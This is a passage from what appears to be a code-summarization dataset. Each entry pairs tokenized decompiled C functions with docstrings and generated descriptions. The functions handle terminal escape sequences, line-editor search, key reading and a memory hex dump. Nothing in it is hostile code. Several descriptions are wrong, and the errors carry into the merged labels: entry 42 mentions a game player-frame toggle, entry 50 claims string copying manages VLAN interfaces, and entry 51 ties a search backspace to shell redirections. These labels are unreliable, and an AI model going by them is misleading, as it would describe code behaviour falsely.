            "The function `seq_to_key1` likely translates escape sequences received from input into corresponding edit key codes, while also providing a debugging feature to display the escape buffer and the character received, facilitating interpretation and handling of escape sequences for a command line editing functionality."
        ],
        "longer_label": "The provided code defines a function `esc_seq_to_key1_shift` which translates escape sequences from input into corresponding edit key codes, incorporating a debugging feature to display the escape buffer and received characters for interpretation and handling of escape sequences in command line editing functionality."
    },
    {
        "id": 41,
        "docstring_tokens": [
            "The",
            "function",
            "`",
            "esc_seq_to_key1_alt",
            "`",
            "returns",
            "an",
            "edit",
            "key",
            "code",
            "based",
            "on",
            "the",
            "input",
            "character",
            "last",
            "."
        ],
        "code_tokens": [
            "__int64",
            "__fastcall",
            "FUN0",
            "(",
            "char",
            "a1",
            ")",
            "{",
            "if",
            "(",
            "a1",
            "=",
            "=",
            "68",
            ")",
            "return",
            "307L",
            "L",
            ";",
            "if",
            "(",
            "a1",
            "<",
            "=",
            "68",
            ")",
            "{",
            "if",
            "(",
            "a1",
            "=",
            "=",
            "67",
            ")",
            "return",
            "306L",
            "L",
            ";",
            "if",
            "(",
            "a1",
            "<",
            "=",
            "67",
            ")",
            "{",
            "if",
            "(",
            "a1",
            "=",
            "=",
            "65",
            ")",
            "return",
            "304L",
            "L",
            ";",
            "if",
            "(",
            "a1",
            "=",
            "=",
            "66",
            ")",
            "return",
            "305L",
            "L",
            ";",
            "}",
            "}",
            "return",
            "256L",
            "L",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The function `seq_to_key1` appears to be a part of an interactive command-line editor, designed to interpret escape sequences (`esc_seq_to_key1_no`) into corresponding key codes and display the current state of an escape buffer (`show_esc_buf`)."
        ],
        "longer_label": "The provided code defines a function, `esc_seq_to_key1_alt`, within an interactive command-line editor, aimed at interpreting escape sequences into key codes, while also displaying the current state of an escape buffer."
    },
    {
        "id": 42,
        "docstring_tokens": [
            "The",
            "function",
            "returns",
            "an",
            "edit",
            "key",
            "code",
            "based",
            "on",
            "the",
            "input",
            "character",
            ",",
            "with",
            "'",
            "A",
            "'",
            "corresponding",
            "to",
            "Alt+Shift+Up",
            ",",
            "'",
            "B",
            "'",
            "to",
            "Alt+Shift+Down",
            ",",
            "'",
            "C",
            "'",
            "to",
            "Alt+Shift+Right",
            ",",
            "'D",
            "'",
            "to",
            "Alt+Shift+Left",
            ",",
            "and",
            "default",
            "to",
            "no",
            "action",
            "."
        ],
        "code_tokens": [
            "__int64",
            "__fastcall",
            "FUN0",
            "(",
            "char",
            "a1",
            ")",
            "{",
            "if",
            "(",
            "a1",
            "=",
            "=",
            "68",
            ")",
            "return",
            "315L",
            "L",
            ";",
            "if",
            "(",
            "a1",
            "<",
            "=",
            "68",
            ")",
            "{",
            "if",
            "(",
            "a1",
            "=",
            "=",
            "67",
            ")",
            "return",
            "314L",
            "L",
            ";",
            "if",
            "(",
            "a1",
            "<",
            "=",
            "67",
            ")",
            "{",
            "if",
            "(",
            "a1",
            "=",
            "=",
            "65",
            ")",
            "return",
            "312L",
            "L",
            ";",
            "if",
            "(",
            "a1",
            "=",
            "=",
            "66",
            ")",
            "return",
            "313L",
            "L",
            ";",
            "}",
            "}",
            "return",
            "256L",
            "L",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The function \"seq_to_key1\" appears to be a part of a program that translates escape sequences into specific key codes for editing purposes.",
            "The function `alt_shift` appears to toggle between two states represented by `c->player->frame` in a game context, possibly alternating player animations or states."
        ],
        "longer_label": "The code defines a function `esc_seq_to_key1_alt_shift` that translates escape sequences into specific key codes for editing purposes, with additional functionality related to toggling between two states represented by `c->player->frame` in a game context."
    },
    {
        "id": 43,
        "docstring_tokens": [
            "The",
            "function",
            "`",
            "esc_seq_to_key1_ctrl",
            "`",
            "returns",
            "a",
            "control",
            "key",
            "code",
            "based",
            "on",
            "the",
            "input",
            "character",
            "'last",
            "'",
            "."
        ],
        "code_tokens": [
            "__int64",
            "__fastcall",
            "FUN0",
            "(",
            "char",
            "a1",
            ")",
            "{",
            "if",
            "(",
            "a1",
            "=",
            "=",
            "68",
            ")",
            "return",
            "285L",
            "L",
            ";",
            "if",
            "(",
            "a1",
            "<",
            "=",
            "68",
            ")",
            "{",
            "if",
            "(",
            "a1",
            "=",
            "=",
            "67",
            ")",
            "return",
            "284L",
            "L",
            ";",
            "if",
            "(",
            "a1",
            "<",
            "=",
            "67",
            ")",
            "{",
            "if",
            "(",
            "a1",
            "=",
            "=",
            "65",
            ")",
            "return",
            "282L",
            "L",
            ";",
            "if",
            "(",
            "a1",
            "=",
            "=",
            "66",
            ")",
            "return",
            "283L",
            "L",
            ";",
            "}",
            "}",
            "return",
            "256L",
            "L",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The function `seq_to_key1` appears to be involved in converting escape sequences to corresponding edit key codes, facilitating input interpretation, particularly in a terminal or console environment."
        ],
        "longer_label": "The code is a function (`esc_seq_to_key1_ctrl`) designed to convert escape sequences representing edit key inputs in a terminal or console environment into corresponding key codes, with specific mappings for certain sequences such as 'D', 'C', 'A', and 'B'."
    },
    {
        "id": 44,
        "docstring_tokens": [
            "The",
            "code",
            "defines",
            "a",
            "function",
            "that",
            "maps",
            "escape",
            "sequences",
            "to",
            "key",
            "codes",
            "based",
            "on",
            "the",
            "parameters",
            "received",
            ",",
            "with",
            "options",
            "for",
            "different",
            "key",
            "combinations",
            "and",
            "special",
            "keys",
            "such",
            "as",
            "insert",
            ",",
            "delete",
            ",",
            "and",
            "function",
            "keys",
            "."
        ],
        "code_tokens": [
            "__int64",
            "__fastcall",
            "FUN0",
            "(",
            "int",
            "a1",
            ",",
            "int",
            "a2",
            ",",
            "char",
            "a3",
            ")",
            "{",
            "if",
            "(",
            "a1",
            "<",
            "0",
            "&",
            "&",
            "a2",
            "<",
            "0",
            ")",
            "return",
            "esc_seq_to_key1_no",
            "(",
            "a3",
            ")",
            ";",
            "if",
            "(",
            "a1",
            "=",
            "=",
            "1",
            "&",
            "&",
            "a2",
            "=",
            "=",
            "2",
            ")",
            "return",
            "esc_seq_to_key1_shift",
            "(",
            "a3",
            ")",
            ";",
            "if",
            "(",
            "a1",
            "=",
            "=",
            "1",
            "&",
            "&",
            "a2",
            "=",
            "=",
            "3",
            ")",
            "return",
            "esc_seq_to_key1_alt",
            "(",
            "a3",
            ")",
            ";",
            "if",
            "(",
            "a1",
            "=",
            "=",
            "1",
            "&",
            "&",
            "a2",
            "=",
            "=",
            "4",
            ")",
            "return",
            "esc_seq_to_key1_alt_shift",
            "(",
            "a3",
            ")",
            ";",
            "if",
            "(",
            "a1",
            "=",
            "=",
            "1",
            "&",
            "&",
            "a2",
            "=",
            "=",
            "5",
            ")",
            "return",
            "esc_seq_to_key1_ctrl",
            "(",
            "a3",
            ")",
            ";",
            "if",
            "(",
            "a2",
            "<",
            "0",
            ")",
            "{",
            "if",
            "(",
            "a3",
            "!",
            "=",
            "126",
            ")",
            "return",
            "256L",
            "L",
            ";",
            "if",
            "(",
            "(",
            "unsigned",
            "int",
            ")",
            "a1",
            "<",
            "=",
            "0x18",
            ")",
            "__asm",
            "{",
            "jmp",
            "rax",
            "}",
            "}",
            "return",
            "256L",
            "L",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The function `_seq_to_key1` appears to be responsible for converting specific escape sequences represented by characters ('A', 'B', etc.) into corresponding edit key codes (like `EDIT_KEY_UP`) and possibly involves displaying debug information related to an escape buffer.",
            "The function `seq_to_key1` appears to be involved in converting escape sequences (likely from keyboard inputs) into corresponding edit key codes, with `show_esc_buf` displaying the escape buffer and `esc_seq_to_key1_no` mapping specific characters to edit key codes.",
            "The \"shift\" function appears to be implemented differently in each code snippet, likely indicating its usage for different purposes such as shifting values in a mathematical context, manipulating strings or characters, or performing indentation and editing operations in a text editor.",
            "The function `_seq_to_key1_alt_shift` likely maps escape sequences to specific keyboard key actions, such as returning `EDIT_KEY_ALT_RIGHT`, `EDIT_KEY_ALT_LEFT`, or `EDIT_KEY_NONE`, depending on the provided input character, possibly for handling alternative or shifted key combinations in an editing environment."
        ],
        "longer_label": "The `esc_seq_to_key1` function takes integer parameters representing escape sequence attributes and a character, mapping them to specific edit key codes while potentially displaying debug information related to an escape buffer, with different cases for handling shift, alt, ctrl, and combinations thereof."
    },
    {
        "id": 45,
        "docstring_tokens": [
            "The",
            "function",
            "`",
            "esc_seq_to_key2",
            "`",
            "returns",
            "an",
            "enum",
            "based",
            "on",
            "the",
            "values",
            "of",
            "`",
            "param1",
            "`",
            "and",
            "`",
            "param2",
            "`",
            ",",
            "as",
            "well",
            "as",
            "the",
            "character",
            "`",
            "last",
            "`",
            ",",
            "with",
            "specific",
            "cases",
            "returning",
            "different",
            "key",
            "codes",
            "and",
            "the",
            "default",
            "case",
            "returning",
            "EDIT_KEY_NONE",
            "."
        ],
        "code_tokens": [
            "__int64",
            "__fastcall",
            "FUN0",
            "(",
            "int",
            "a1",
            ",",
            "int",
            "a2",
            ",",
            "char",
            "a3",
            ")",
            "{",
            "unsigned",
            "int",
            "v4",
            ";",
            "if",
            "(",
            "a1",
            ">",
            "=",
            "0",
            "|",
            "|",
            "a2",
            ">",
            "=",
            "0",
            ")",
            "return",
            "256L",
            "L",
            ";",
            "v4",
            "=",
            "a3",
            "-",
            "70",
            ";",
            "if",
            "(",
            "v4",
            "<",
            "=",
            "0xD",
            ")",
            "__asm",
            "{",
            "jmp",
            "rax",
            "}",
            "return",
            "256L",
            "L",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The function `seq_to_key` likely translates escape sequences into corresponding key codes or actions for input processing in a text or command-line interface."
        ],
        "longer_label": "The function `esc_seq_to_key2` translates escape sequences into corresponding key codes or actions for input processing in a text or command-line interface, returning 256 if `a1` or `a2` is greater than or equal to 0, otherwise processing the character `a3` and returning 256 if it does not match any defined sequence."
    },
    {
        "id": 46,
        "docstring_tokens": [
            "The",
            "code",
            "prints",
            "the",
            "contents",
            "of",
            "a",
            "virtual",
            "machine",
            "'s",
            "memory",
            "in",
            "hexadecimal",
            "format",
            ",",
            "displaying",
            "memory",
            "addresses",
            "and",
            "values",
            "with",
            "a",
            "line",
            "break",
            "every",
            "square",
            "root",
            "of",
            "the",
            "memory",
            "size",
            "."
        ],
        "code_tokens": [
            "void",
            "__cdecl",
            "FUN0",
            "(",
            "t_vm",
            "*",
            "vm",
            ")",
            "{",
            "char",
            "v1",
            ";",
            "int",
            "i",
            ";",
            "for",
            "(",
            "i",
            "=",
            "0",
            ";",
            "i",
            "<",
            "=",
            "4095",
            ";",
            "+",
            "+",
            "i",
            ")",
            "{",
            "if",
            "(",
            "!",
            "(",
            "i",
            "%",
            "0x40u",
            ")",
            ")",
            "{",
            "if",
            "(",
            "i",
            ")",
            "(",
            "(",
            "void",
            "(",
            "__fastcall",
            "*",
            ")",
            "(",
            "__int64",
            ")",
            ")",
            "putchar",
            ")",
            "(",
            "10L",
            "L",
            ")",
            ";",
            "printf",
            "(",
            "\"%#06x : \"",
            ",",
            "(",
            "unsigned",
            "int",
            ")",
            "i",
            ")",
            ";",
            "}",
            "v1",
            "=",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "vm",
            "-",
            ">",
            "memory",
            "[",
            "i",
            "]",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            ";",
            "if",
            "(",
            "v1",
            "!",
            "=",
            "0",
            "&",
            "&",
            "(",
            "(",
            "i",
            "+",
            "(",
            "unsigned",
            "__int8",
            ")",
            "vm",
            ")",
            "&",
            "7",
            ")",
            ">",
            "=",
            "v1",
            ")",
            "_asan_report_load1",
            "(",
            "&",
            "vm",
            "-",
            ">",
            "memory",
            "[",
            "i",
            "]",
            ")",
            ";",
            "h_puthex",
            "(",
            "vm",
            "-",
            ">",
            "memory",
            "[",
            "i",
            "]",
            ")",
            ";",
            "(",
            "(",
            "void",
            "(",
            "__fastcall",
            "*",
            ")",
            "(",
            "__int64",
            ")",
            ")",
            "putchar",
            ")",
            "(",
            "32L",
            "L",
            ")",
            ";",
            "}",
            "(",
            "(",
            "void",
            "(",
            "__fastcall",
            "*",
            ")",
            "(",
            "__int64",
            ")",
            ")",
            "putchar",
            ")",
            "(",
            "10L",
            "L",
            ")",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The printf function in the provided code snippets is used for formatting and printing output to the console in the C programming language.",
            "The function asan_report_load1 is used to report the loading of 1 byte memory accesses for AddressSanitizer (ASan) for debugging and performance analysis.",
            "The function \"h_puthex\" prints a given unsigned char as a two-digit hexadecimal number."
        ],
        "longer_label": "The code snippet is a C function that iterates through a virtual machine's memory, prints the memory addresses and values in hexadecimal format, and includes debugging checks for memory access using AddressSanitizer."
    },
    {
        "id": 47,
        "docstring_tokens": [
            "The",
            "code",
            "defines",
            "a",
            "function",
            "that",
            "converts",
            "an",
            "escape",
            "sequence",
            "to",
            "a",
            "key",
            "code",
            ",",
            "taking",
            "into",
            "account",
            "parameters",
            "and",
            "different",
            "types",
            "of",
            "escape",
            "sequences",
            ",",
            "and",
            "returns",
            "the",
            "corresponding",
            "key",
            "code",
            "or",
            "'EDIT_KEY_NONE",
            "'",
            "if",
            "the",
            "sequence",
            "is",
            "unknown",
            "."
        ],
        "code_tokens": [
            "__int64",
            "__fastcall",
            "FUN0",
            "(",
            "const",
            "char",
            "*",
            "a1",
            ")",
            "{",
            "char",
            "v2",
            ";",
            "int",
            "v3",
            ";",
            "int",
            "v4",
            ";",
            "unsigned",
            "int",
            "v5",
            ";",
            "char",
            "*",
            "i",
            ";",
            "__int64",
            "v7",
            ";",
            "v3",
            "=",
            "-",
            "1",
            ";",
            "v4",
            "=",
            "-",
            "1",
            ";",
            "v5",
            "=",
            "256",
            ";",
            "v2",
            "=",
            "0",
            ";",
            "for",
            "(",
            "i",
            "=",
            "(",
            "char",
            "*",
            ")",
            "a1",
            ";",
            "*",
            "i",
            ";",
            "+",
            "+",
            "i",
            ")",
            "v2",
            "=",
            "*",
            "i",
            ";",
            "if",
            "(",
            "a1",
            "[",
            "1",
            "]",
            ">",
            "47",
            "&",
            "&",
            "a1",
            "[",
            "1",
            "]",
            "<",
            "=",
            "57",
            ")",
            "{",
            "v3",
            "=",
            "atoi",
            "(",
            "a1",
            "+",
            "1",
            ")",
            ";",
            "v7",
            "=",
            "os_strchr",
            "(",
            "a1",
            ",",
            "59L",
            "L",
            ")",
            ";",
            "if",
            "(",
            "v7",
            ")",
            "v4",
            "=",
            "atoi",
            "(",
            "(",
            "const",
            "char",
            "*",
            ")",
            "(",
            "v7",
            "+",
            "1",
            ")",
            ")",
            ";",
            "}",
            "if",
            "(",
            "*",
            "a1",
            "=",
            "=",
            "91",
            ")",
            "{",
            "v5",
            "=",
            "esc_seq_to_key1",
            "(",
            "v3",
            ",",
            "v4",
            ",",
            "v2",
            ")",
            ";",
            "}",
            "else",
            "if",
            "(",
            "*",
            "a1",
            "=",
            "=",
            "79",
            ")",
            "{",
            "v5",
            "=",
            "esc_seq_to_key2",
            "(",
            "v3",
            ",",
            "v4",
            ",",
            "v2",
            ")",
            ";",
            "}",
            "if",
            "(",
            "v5",
            "!",
            "=",
            "256",
            ")",
            "return",
            "v5",
            ";",
            "edit_clear_line",
            "(",
            ")",
            ";",
            "printf",
            "(",
            "\"\\rUnknown escape sequence '%s'\\n\"",
            ",",
            "a1",
            ")",
            ";",
            "edit_redraw",
            "(",
            ")",
            ";",
            "return",
            "256L",
            "L",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The function `os_strch` appears to search for the first occurrence of a specified character in a given string and returns a pointer to it, or to the end of the string if the character is not found, facilitating string manipulation tasks such as parsing URLs or processing data packets.",
            "The function `edit_clear_line` seems to be intended for clearing the current input line in an interactive text editing or command line interface, likely as part of a larger text editing or command line editing library, based on the provided code snippets.",
            "The function edit_redraw is used to clear and redraw the text input line in a command-line interface, by resetting the cursor position and updating any lines between the old and current text."
        ],
        "longer_label": "The code is a function that processes escape sequences in a given string, including searching for specific characters, clearing the current input line, and handling unknown escape sequences in a command-line interface."
    },
    {
        "id": 48,
        "docstring_tokens": [
            "The",
            "code",
            "reads",
            "and",
            "processes",
            "keyboard",
            "input",
            "from",
            "a",
            "socket",
            "connection",
            ",",
            "handling",
            "special",
            "key",
            "sequences",
            "and",
            "returning",
            "corresponding",
            "enum",
            "values",
            "."
        ],
        "code_tokens": [
            "__int64",
            "__fastcall",
            "FUN0",
            "(",
            "int",
            "a1",
            ")",
            "{",
            "int",
            "v2",
            ";",
            "int",
            "v3",
            ";",
            "int",
            "v4",
            ";",
            "unsigned",
            "__int8",
            "buf",
            ";",
            "unsigned",
            "__int64",
            "v6",
            ";",
            "v6",
            "=",
            "__readfsqword",
            "(",
            "0x28u",
            ")",
            ";",
            "v3",
            "=",
            "read",
            "(",
            "a1",
            ",",
            "&",
            "buf",
            ",",
            "1uL",
            "L",
            ")",
            ";",
            "if",
            "(",
            "v3",
            "<",
            "0",
            ")",
            "perror",
            "(",
            "\"read\"",
            ")",
            ";",
            "if",
            "(",
            "v3",
            "<",
            "=",
            "0",
            ")",
            "return",
            "316L",
            "L",
            ";",
            "v4",
            "=",
            "buf",
            ";",
            "if",
            "(",
            "esc_5731",
            ">",
            "=",
            "0",
            ")",
            "{",
            "if",
            "(",
            "buf",
            "=",
            "=",
            "27",
            ")",
            "{",
            "esc_5731",
            "=",
            "0",
            ";",
            "return",
            "256L",
            "L",
            ";",
            "}",
            "if",
            "(",
            "esc_5731",
            "=",
            "=",
            "6",
            ")",
            "{",
            "show_esc_buf",
            "(",
            "esc_buf_5732",
            ",",
            "buf",
            ",",
            "0",
            ")",
            ";",
            "esc_5731",
            "=",
            "-",
            "1",
            ";",
            "}",
            "else",
            "{",
            "v2",
            "=",
            "esc_5731",
            "+",
            "+",
            ";",
            "esc_buf_5732",
            "[",
            "v2",
            "]",
            "=",
            "buf",
            ";",
            "esc_buf_5732",
            "[",
            "esc_5731",
            "]",
            "=",
            "0",
            ";",
            "}",
            "}",
            "if",
            "(",
            "esc_5731",
            "=",
            "=",
            "1",
            ")",
            "{",
            "if",
            "(",
            "esc_buf_5732",
            "[",
            "0",
            "]",
            "=",
            "=",
            "91",
            "|",
            "|",
            "esc_buf_5732",
            "[",
            "0",
            "]",
            "=",
            "=",
            "79",
            ")",
            "{",
            "return",
            "256L",
            "L",
            ";",
            "}",
            "else",
            "{",
            "show_esc_buf",
            "(",
            "esc_buf_5732",
            ",",
            "v4",
            ",",
            "1u",
            ")",
            ";",
            "esc_5731",
            "=",
            "-",
            "1",
            ";",
            "return",
            "256L",
            "L",
            ";",
            "}",
            "}",
            "else",
            "if",
            "(",
            "esc_5731",
            "<",
            "=",
            "1",
            ")",
            "{",
            "if",
            "(",
            "(",
            "unsigned",
            "int",
            ")",
            "v4",
            "<",
            "=",
            "0x7F",
            ")",
            "__asm",
            "{",
            "jmp",
            "rax",
            "}",
            "return",
            "(",
            "unsigned",
            "int",
            ")",
            "v4",
            ";",
            "}",
            "else",
            "if",
            "(",
            "v4",
            ">",
            "47",
            "&",
            "&",
            "v4",
            "<",
            "=",
            "57",
            "|",
            "|",
            "v4",
            "=",
            "=",
            "59",
            ")",
            "{",
            "return",
            "256L",
            "L",
            ";",
            "}",
            "else",
            "if",
            "(",
            "v4",
            "=",
            "=",
            "126",
            "|",
            "|",
            "v4",
            ">",
            "64",
            "&",
            "&",
            "v4",
            "<",
            "=",
            "90",
            ")",
            "{",
            "esc_5731",
            "=",
            "-",
            "1",
            ";",
            "return",
            "esc_seq_to_key",
            "(",
            "esc_buf_5732",
            ")",
            ";",
            "}",
            "else",
            "{",
            "show_esc_buf",
            "(",
            "esc_buf_5732",
            ",",
            "v4",
            ",",
            "2u",
            ")",
            ";",
            "esc_5731",
            "=",
            "-",
            "1",
            ";",
            "return",
            "256L",
            "L",
            ";",
            "}",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The function name \"__read\" suggests its purpose is to handle reading operations from devices or files, utilizing pointers and structures like \"device_t\" and \"FILE\", with associated functionalities such as memory allocation, device management, and file system interaction, potentially for system-level operations or library interface management."
        ],
        "longer_label": "The provided code appears to be a function named \"edit_read_key\" which reads input from a file descriptor, handles escape sequences and special key combinations, and returns corresponding key codes or status values, possibly used for managing user input in a terminal or console application."
    },
    {
        "id": 49,
        "docstring_tokens": [
            "The",
            "function",
            "search_redraw",
            "searches",
            "for",
            "a",
            "match",
            "in",
            "the",
            "search",
            "buffer",
            "and",
            "prints",
            "the",
            "result",
            "on",
            "the",
            "console",
            "."
        ],
        "code_tokens": [
            "int",
            "FUN0",
            "(",
            ")",
            "{",
            "const",
            "char",
            "*",
            "v0",
            ";",
            "__int64",
            "*",
            "v2",
            ";",
            "v2",
            "=",
            "search_find",
            "(",
            ")",
            ";",
            "if",
            "(",
            "v2",
            ")",
            "v0",
            "=",
            "(",
            "const",
            "char",
            "*",
            ")",
            "v2",
            ";",
            "else",
            "v0",
            "=",
            "(",
            "const",
            "char",
            "*",
            ")",
            "&",
            "unk_459C",
            ";",
            "printf",
            "(",
            "\"\\rsearch '%s': %s\\x1B[K\"",
            ",",
            "search_buf",
            ",",
            "v0",
            ")",
            ";",
            "printf",
            "(",
            "\"\\rsearch '%s\"",
            ",",
            "search_buf",
            ")",
            ";",
            "return",
            "fflush",
            "(",
            "stdout",
            ")",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The `search` function appears to be used in multiple contexts: for traversing a binary tree to find a specific key, for searching in a grid while ignoring certain conditions, and for initializing search-related variables in a larger system, suggesting a versatile utility for various search operations within different domains.",
            "The printf function in the provided code snippets is used for outputting formatted data to the console or other output devices."
        ],
        "longer_label": "The code defines a function `search_redraw` which searches for a key and prints the result to the console, utilizing a versatile `search_find` function to locate the key within different contexts, and employing `printf` for formatted output."
    },
    {
        "id": 50,
        "docstring_tokens": [
            "This",
            "code",
            "searches",
            "for",
            "a",
            "match",
            "using",
            "the",
            "search_find",
            "function",
            ",",
            "clears",
            "the",
            "search",
            "buffer",
            ",",
            "copies",
            "the",
            "match",
            "to",
            "the",
            "cmdbuf",
            ",",
            "and",
            "then",
            "redraws",
            "the",
            "editor",
            "."
        ],
        "code_tokens": [
            "int",
            "FUN0",
            "(",
            ")",
            "{",
            "__int64",
            "*",
            "v1",
            ";",
            "v1",
            "=",
            "search_find",
            "(",
            ")",
            ";",
            "search_buf",
            "[",
            "0",
            "]",
            "=",
            "0",
            ";",
            "search_clear",
            "(",
            ")",
            ";",
            "if",
            "(",
            "v1",
            ")",
            "{",
            "os_strlcpy",
            "(",
            "cmdbuf",
            ",",
            "v1",
            ",",
            "4096L",
            "L",
            ")",
            ";",
            "cmdbuf_len",
            "=",
            "os_strlen",
            "(",
            "cmdbuf",
            ")",
            ";",
            "cmdbuf_pos",
            "=",
            "cmdbuf_len",
            ";",
            "}",
            "return",
            "edit_redraw",
            "(",
            ")",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The \"search\" function appears to be used in various contexts, including binary tree traversal, grid traversal for pathfinding, and symbol searching in code segments, suggesting it's a versatile function designed for searching and possibly traversing data structures or elements within arrays or linked lists.",
            "The \"clear\" function is used to clear the contents or allocate memory for a specific data structure or buffer.",
            "The function `os_strlc` appears to be involved in managing VLAN interfaces and configuring hostapd interfaces, primarily dealing with string copying and interface initialization within the hostapd software framework.",
            "The `return` function seems to be a misnomer, as it's not a function itself but rather appears as a token commonly used in programming languages to exit a function and return a value; the provided code snippets include a struct definition, a scene function that calculates signed distance and emissive values based on a given coordinate, a function related to interception device handling, and a simple C program printing \"Hello World\".",
            "The `_redraw` function is likely responsible for updating or refreshing the display of elements such as buttons or tracks within a graphical user interface, using the provided code snippets for drawing and handling terminal output."
        ],
        "longer_label": "The code appears to involve a versatile \"search\" function for traversing and searching data structures, a \"clear\" function for clearing data structures, and the use of \"os_strlcpy\" for managing VLAN interfaces and configuring hostapd interfaces within the hostapd software framework."
    },
    {
        "id": 51,
        "docstring_tokens": [
            "This",
            "function",
            "searches",
            "for",
            "and",
            "removes",
            "the",
            "last",
            "character",
            "from",
            "a",
            "string",
            "stored",
            "in",
            "a",
            "buffer",
            ",",
            "then",
            "triggers",
            "a",
            "redraw",
            "."
        ],
        "code_tokens": [
            "int",
            "FUN0",
            "(",
            ")",
            "{",
            "__int64",
            "v0",
            ";",
            "v0",
            "=",
            "os_strlen",
            "(",
            "search_buf",
            ")",
            ";",
            "if",
            "(",
            "v0",
            ")",
            "{",
            "search_buf",
            "[",
            "v0",
            "-",
            "1",
            "]",
            "=",
            "0",
            ";",
            "search_skip",
            "=",
            "0",
            ";",
            "LODWORD",
            "(",
            "v0",
            ")",
            "=",
            "search_redraw",
            "(",
            ")",
            ";",
            "}",
            "return",
            "v0",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The function `search_red` appears to be designed to traverse a linked list of tokens (`t_tokens`) in a command structure (`t_cmd`) to identify and process redirections, such as changing file descriptors or types, within shell commands."
        ],
        "longer_label": "The given function `search_backspace` is likely intended to delete the last character in a search buffer, update a skip counter, and then redraw a search interface, possibly in the context of a shell-like environment where it's used to process redirections in commands."
    },
    {
        "id": 52,
        "docstring_tokens": [
            "This",
            "code",
            "adds",
            "a",
            "character",
            "to",
            "a",
            "buffer",
            "and",
            "updates",
            "a",
            "skip",
            "variable",
            "before",
            "redrawing",
            "the",
            "search",
            "results",
            "."
        ],
        "code_tokens": [
            "int",
            "__fastcall",
            "FUN0",
            "(",
            "char",
            "a1",
            ")",
            "{",
            "__int64",
            "v1",
            ";",
            "v1",
            "=",
            "os_strlen",
            "(",
            "search_buf",
            ")",
            ";",
            "if",
            "(",
            "v1",
            "!",
            "=",
            "20",
            ")",
            "{",
            "search_buf",
            "[",
            "v1",
            "]",
            "=",
            "a1",
            ";",
            "search_buf",
            "[",
            "v1",
            "+",
            "1",
            "]",
            "=",
            "0",
            ";",
            "search_skip",
            "=",
            "0",
            ";",
            "LODWORD",
            "(",
            "v1",
            ")",
            "=",
            "search_redraw",
            "(",
            ")",
            ";",
            "}",
            "return",
            "v1",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The function search_redraw is used to refresh and update the search interface, including displaying the search results and redrawing the search input field."
        ],
        "longer_label": "The provided code is a function named search_char that appends a character to a buffer, updates a skip variable, and then calls a function search_redraw to refresh the search interface."
    },
    {
        "id": 53,
        "docstring_tokens": [
            "This",
            "code",
            "defines",
            "a",
            "function",
            "that",
            "takes",
            "an",
            "edit_key_code",
            "as",
            "input",
            "and",
            "performs",
            "different",
            "actions",
            "based",
            "on",
            "the",
            "value",
            "of",
            "the",
            "input",
            ",",
            "including",
            "stopping",
            "a",
            "search",
            ",",
            "canceling",
            "a",
            "search",
            ",",
            "handling",
            "backspace",
            ",",
            "searching",
            "for",
            "the",
            "next",
            "occurrence",
            ",",
            "searching",
            "for",
            "a",
            "specific",
            "character",
            ",",
            "and",
            "returning",
            "a",
            "default",
            "value",
            "if",
            "no",
            "specific",
            "action",
            "is",
            "performed",
            "."
        ],
        "code_tokens": [
            "__int64",
            "__fastcall",
            "FUN0",
            "(",
            "unsigned",
            "int",
            "a1",
            ")",
            "{",
            "if",
            "(",
            "a1",
            "-",
            "258",
            "<",
            "=",
            "0x29",
            ")",
            "__asm",
            "{",
            "jmp",
            "rax",
            "}",
            "if",
            "(",
            "a1",
            ">",
            "0x1F",
            "&",
            "&",
            "a1",
            "<",
            "=",
            "0xFF",
            ")",
            "search_char",
            "(",
            "a1",
            ")",
            ";",
            "return",
            "256L",
            "L",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The search function is used to look for a specific key within a data structure, such as a binary tree, a grid, or a list of symbols and nodes."
        ],
        "longer_label": "The code is a search function that checks if a given key is within a certain range and then calls another function if the key meets the specified criteria."
    },
    {
        "id": 54,
        "docstring_tokens": [
            "The",
            "code",
            "defines",
            "a",
            "function",
            "that",
            "reads",
            "and",
            "processes",
            "user",
            "input",
            "to",
            "perform",
            "various",
            "editing",
            "operations",
            "and",
            "commands",
            "in",
            "a",
            "console-based",
            "text",
            "editor",
            "."
        ],
        "code_tokens": [
            "int",
            "__fastcall",
            "FUN0",
            "(",
            "int",
            "a1",
            ")",
            "{",
            "int",
            "result",
            ";",
            "unsigned",
            "int",
            "key",
            ";",
            "result",
            "=",
            "wait_reply",
            ";",
            "if",
            "(",
            "!",
            "wait_reply",
            ")",
            "{",
            "key",
            "=",
            "edit_read_key",
            "(",
            "a1",
            ")",
            ";",
            "if",
            "(",
            "!",
            "search_5819",
            "|",
            "|",
            "(",
            "result",
            "=",
            "search_key",
            "(",
            "key",
            ")",
            ",",
            "key",
            "=",
            "result",
            ",",
            "result",
            "!",
            "=",
            "256",
            ")",
            "&",
            "&",
            "(",
            "search_5819",
            "=",
            "0",
            ",",
            "result",
            "!",
            "=",
            "316",
            ")",
            ")",
            "{",
            "if",
            "(",
            "key",
